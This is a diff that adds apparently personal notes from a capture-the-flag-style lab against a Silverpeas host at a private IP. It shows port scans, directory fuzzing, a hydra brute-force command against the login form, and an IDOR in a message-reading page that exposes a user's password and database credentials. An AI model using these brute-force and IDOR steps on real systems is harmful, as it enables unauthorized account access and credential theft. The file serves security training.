@@ -1,0 +1,63 @@
+RESULTADO RUSTSCAN:
+
+Open 10.65.189.90:22
+Open 10.65.189.90:80
+Open 10.65.189.90:8080
+
+RESULTADO NMAP:
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 22:b0:09:e7:88:e0:03:8f:b0:2e:ab:19:80:1f:db:69 (ECDSA)
+|_  256 b5:f2:28:a0:c1:2d:a4:6b:e8:5c:dd:de:33:fc:4d:fa (ED25519)
+80/tcp   open  http       nginx 1.18.0 (Ubuntu)
+|_http-title: Hack Smarter Security
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Sat, 14 Mar 2026 00:51:51 GMT
+
+
+RESULTADO FFUF:
+
+console                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 240ms]
+website                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 250ms]
+silverpeas              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 891ms]
+console                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 152ms]
+
+--> http://10.65.189.90/#contact
+
+If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
+
+USERNAME: scr1ptkiddy
+
+--> http://10.65.189.90:8080/silverpeas/defaultLogin.jsp (PÁGINA DE LOGIN)
+
+BRUTE FORCE:
+
+hydra -l scr1ptkiddy -P WORDLIST-SENHAS-AQUI IP-DA-MAQUINA -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect" -f -I -V
+
+PASSWORD: adipiscing
+
+USERNAME: scr1ptkiddy
+PASSWORD: adipiscing
+
+VULNERABILIDADE: BOLA/IDOR
+
+CREDÊNCIAIS ENCONTRADAS:
+
+
+--> url: http://10.65.189.90:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
+
+Username: tim
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+
+Password_db: _Zd_zx7N823/
+db_user: silverpeas
+db_name: Silverpeas
